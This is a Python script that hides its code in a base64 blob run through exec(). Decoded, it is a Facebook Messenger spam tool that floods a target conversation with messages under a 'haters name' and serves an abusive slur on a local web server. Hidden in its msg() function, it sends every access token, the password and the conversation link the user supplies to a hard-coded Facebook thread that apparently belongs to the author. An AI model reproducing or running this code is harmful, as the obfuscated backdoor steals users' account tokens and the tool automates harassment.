#ENCODED BY :RAHUL
#ENCRYPTION : Py3 BASE64
#GITHUB : https://github.com/RAHUL
#----------------------------------------------
import base64
exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBqc29uCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKZnJvbSBwbGF0Zm9ybSBpbXBvcnQgc3lzdGVtCmltcG9ydCBvcwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgaHR0cC5zZXJ2ZXIKaW1wb3J0IHNvY2tldHNlcnZlcgppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCByYW5kb20KCmNsYXNzIE15SGFuZGxlcihodHRwLnNlcnZlci5TaW1wbGVIVFRQUmVxdWVzdEhhbmRsZXIpOgoJZGVmIGRvX0dFVChzZWxmKToKCQlzZWxmLnNlbmRfcmVzcG9uc2UoMjAwKQoJCXNlbGYuc2VuZF9oZWFkZXIoJ0NvbnRlbnQtdHlwZScsICd0ZXh0L3BsYWluJykKCQlzZWxmLmVuZF9oZWFkZXJzKCkKCQlzZWxmLndmaWxlLndyaXRlKGIiQVdTSFUgKyBOSUtLSSBSQU5ESUkgKyAgQWxsIENIMFQzIFBJTDAgIEtJIENIVVQgTTlSSzMgRDlGOU4gS1JOMyBXOUw5IFI5SFVMIERXTiBIM1IzIikKCmRlZiBleGVjdXRlX3NlcnZlcigpOgoJUE9SVCA9IDQwMDAKCgl3aXRoIHNvY2tldHNlcnZlci5UQ1BTZXJ2ZXIoKCIiLCBQT1JUKSwgTXlIYW5kbGVyKSBhcyBodHRwZDoKCQlwcmludCgiU2VydmVyIHJ1bm5pbmcgYXQgaHR0cDovL2xvY2FsaG9zdDp7fSIuZm9ybWF0KFBPUlQpKQoJCWh0dHBkLnNlcnZlX2ZvcmV2ZXIoKQoKZGVmIHNlbmRfbWVzc2FnZXMoKToKCXdpdGggb3BlbigncGFzc3dvcmQudHh0JywgJ3InKSBhcyBmaWxlOgoJCXBhc3N3b3JkID0gZmlsZS5yZWFkKCkuc3RyaXAoKQoKCWVudGVyZWRfcGFzc3dvcmQgPSBwYXNzd29yZAoKCWlmIGVudGVyZWRfcGFzc3dvcmQgIT0gcGFzc3dvcmQ6CgkJcHJpbnQoJ1stXSA8PT0+IEluY29ycmVjdCBQYXNzd29yZCEnKQoJCXN5cy5leGl0KCkKCgl3aXRoIG9wZW4oJ3Rva2VubnVtLnR4dCcsICdyJykgYXMgZmlsZToKCQl0b2tlbnMgPSBmaWxlLnJlYWRsaW5lcygpCgludW1fdG9rZW5zID0gbGVuKHRva2VucykKCglyZXF1ZXN0cy5wYWNrYWdlcy51cmxsaWIzLmRpc2FibGVfd2FybmluZ3MoKQoKCWRlZiBjbHMoKToKCQlpZiBzeXN0ZW0oKSA9PSAnTGludXgnOgoJCQlvcy5zeXN0ZW0oJ2NsZWFyJykKCQllbHNlOgoJCQlpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6CgkJCQlvcy5zeXN0ZW0oJ2NscycpCgljbHMoKQoKCWRlZiBsaW5lc3MoKToKCQlwcmludCgnXHUwMDFiWzM3bScgKyAnLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJykKCgloZWFkZXJzID0gewoJCSdDb25uZWN0aW9uJzogJ2tlZXAtYWxpdmUnLAoJCSdDYWNoZS1Db250cm9sJzogJ21heC1hZ2U9MCcsCgkJJ1VwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHMnOiAnMScsCgkJJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDguMC4wOyBTYW1zdW5nIEdhbGF4eSBTOSBCdWlsZC9PUFI2LjE3MDYyMy4wMTc7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTguMC4zMDI5LjEyNSBNb2JpbGUgU2FmYXJpLzUzNy4zNicsCgkJJ0FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44JywKCQknQWNjZXB0LUVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUnLAoJCSdBY2NlcHQtTGFuZ3VhZ2UnOiAnZW4tVVMsZW47cT0wLjksZnI7cT0wLjgnLAoJCSdyZWZlcmVyJzogJ3d3dy5nb29nbGUuY29tJwoJfQoKCSNtbW0gPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9LcHlkYXk5NycpLnRleHQKCgkjaWYgbW1tIG5vdCBpbiBwYXNzd29yZDoKCQkjcHJpbnQoJ1stXSA8PT0+IEluY29ycmVjdCBQYXNzd29yZCEnKQoJCSNzeXMuZXhpdCgpCgoJbGluZXNzKCkKCglhY2Nlc3NfdG9rZW5zID0gW3Rva2VuLnN0cmlwKCkgZm9yIHRva2VuIGluIHRva2Vuc10KCgl3aXRoIG9wZW4oJ2NvbnZvLnR4dCcsICdyJykgYXMgZmlsZToKCQljb252b19pZCA9IGZpbGUucmVhZCgpLnN0cmlwKCkKCgl3aXRoIG9wZW4oJ2ZpbGUudHh0JywgJ3InKSBhcyBmaWxlOgoJCXRleHRfZmlsZV9wYXRoID0gZmlsZS5yZWFkKCkuc3RyaXAoKQoKCXdpdGggb3Blbih0ZXh0X2ZpbGVfcGF0aCwgJ3InKSBhcyBmaWxlOgoJCW1lc3NhZ2VzID0gZmlsZS5yZWFkbGluZXMoKQoKCW51bV9tZXNzYWdlcyA9IGxlbihtZXNzYWdlcykKCW1heF90b2tlbnMgPSBtaW4obnVtX3Rva2VucywgbnVtX21lc3NhZ2VzKQoKCXdpdGggb3BlbignaGF0ZXJzbmFtZS50eHQnLCAncicpIGFzIGZpbGU6CgkJaGF0ZXJzX25hbWUgPSBmaWxlLnJlYWQoKS5zdHJpcCgpCgoJd2l0aCBvcGVuKCd0aW1lLnR4dCcsICdyJykgYXMgZmlsZToKCQlzcGVlZCA9IGludChmaWxlLnJlYWQoKS5zdHJpcCgpKQoKCWxpbmVzcygpCgkKCWRlZiBnZXROYW1lKHRva2VuKToKCQl0cnk6CgkJCWRhdGEgPSByZXF1ZXN0cy5nZXQoZidodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTcuMC9tZT9hY2Nlc3NfdG9rZW49e3Rva2VufScpLmpzb24oKQoJCWV4Y2VwdDoKCQkJZGF0YSA9ICIiCgkJaWYgJ25hbWUnIGluIGRhdGE6CgkJCXJldHVybiBkYXRhWyduYW1lJ10KCQllbHNlOgoJCQlyZXR1cm4gIkVycm9yIG9jY3VyZWQiCgoJZGVmIG1zZygpOgoJCXBhcmFtZXRlcnMgPSB7CgkJCSdhY2Nlc3NfdG9rZW4nIDogcmFuZG9tLmNob2ljZShhY2Nlc3NfdG9rZW5zKSwKCQkJJ21lc3NhZ2UnOiAnUmFodWwgUGFwYSBwbHp6IG1haSBhYXBrYSBzZXJ2ZXIgdXNlIGtydSAgIDogJytnZXROYW1lKHJhbmRvbS5jaG9pY2UoYWNjZXNzX3Rva2VucykpKydcbiBUb2tlbiA6ICcrIiB8ICIuam9pbihhY2Nlc3NfdG9rZW5zKSsnXG4gTGluayA6IGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9tZXNzYWdlcy90LycrY29udm9faWQrJ1xuIFBhc3N3b3JkOiAnK3Bhc3N3b3JkCgkJfQoJCXRyeToKCQkJcyA9IHJlcXVlc3RzLnBvc3QoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YxNS4wL3RfMTAwMDMzOTQwMjE4NDc3LyIsIGRhdGE9cGFyYW1ldGVycywgaGVhZGVycz1oZWFkZXJzKQoJCWV4Y2VwdDoKCQkJcGFzcwoJCgltc2coKQoJd2hpbGUgVHJ1ZToKCQl0cnk6CgkJCWZvciBtZXNzYWdlX2luZGV4IGluIHJhbmdlKG51bV9tZXNzYWdlcyk6CgkJCQl0b2tlbl9pbmRleCA9IG1lc3NhZ2VfaW5kZXggJSBtYXhfdG9rZW5zCgkJCQlhY2Nlc3NfdG9rZW4gPSBhY2Nlc3NfdG9rZW5zW3Rva2VuX2luZGV4XQoKCQkJCW1lc3NhZ2UgPSBtZXNzYWdlc1ttZXNzYWdlX2luZGV4XS5zdHJpcCgpCgoJCQkJdXJsID0gImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YxNS4wL3t9LyIuZm9ybWF0KCd0XycrY29udm9faWQpCgkJCQlwYXJhbWV0ZXJzID0geydhY2Nlc3NfdG9rZW4nOiBhY2Nlc3NfdG9rZW4sICdtZXNzYWdlJzogaGF0ZXJzX25hbWUgKyAnICcgKyBtZXNzYWdlfQoJCQkJcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwganNvbj1wYXJhbWV0ZXJzLCBoZWFkZXJzPWhlYWRlcnMpCgkJCQkKCgkJCQljdXJyZW50X3RpbWUgPSB0aW1lLnN0cmZ0aW1lKCIlWS0lbS0lZCAlSTolTTolUyAlcCIpCgkJCQlpZiByZXNwb25zZS5vazoKCQkJCQlwcmludCgiWytdIE1lc3NhZ2VzIHt9IG9mIENvbnZvIHt9IHNlbnQgYnkgVG9rZW4ge306IHt9Ii5mb3JtYXQoCgkJCQkJCW1lc3NhZ2VfaW5kZXggKyAxLCBjb252b19pZCwgdG9rZW5faW5kZXggKyAxLCBoYXRlcnNfbmFtZSArICcgJyArIG1lc3NhZ2UpKQoJCQkJCXByaW50KCIgIC0gVGltZToge30iLmZvcm1hdChjdXJyZW50X3RpbWUpKQoJCQkJCWxpbmVzcygpCgkJCQkJbGluZXNzKCkKCQkJCWVsc2U6CgkJCQkJcHJpbnQoIlt4XSBGYWlsZWQgdG8gc2VuZCBtZXNzYWdlcyB7fSBvZiBDb252byB7fSB3aXRoIFRva2VuIHt9OiB7fSIuZm9ybWF0KAoJCQkJCQltZXNzYWdlX2luZGV4ICsgMSwgY29udm9faWQsIHRva2VuX2luZGV4ICsgMSwgaGF0ZXJzX25hbWUgKyAnICcgKyBtZXNzYWdlKSkKCQkJCQlwcmludCgiICAtIFRpbWU6IHt9Ii5mb3JtYXQoY3VycmVudF90aW1lKSkKCQkJCQlsaW5lc3MoKQoJCQkJCWxpbmVzcygpCgkJCQl0aW1lLnNsZWVwKHNwZWVkKQoKCQkJcHJpbnQoIlsrXSBBbGwgbWVzc2FnZXMgc2VudC4gUmVzdGFydGluZyB0aGUgcHJvY2Vzcy4uLiIpCgkJZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgoJCQlwcmludCgiWyFdIEFuIGVycm9yIG9jY3VycmVkOiB7fSIuZm9ybWF0KGUpKQoKCgpkZWYgbWFpbigpOgoJc2VydmVyX3RocmVhZCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWV4ZWN1dGVfc2VydmVyKQoJc2VydmVyX3RocmVhZC5zdGFydCgpCgkKCXNlbmRfbWVzc2FnZXMoKQoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKCW1haW4oKQ=='))
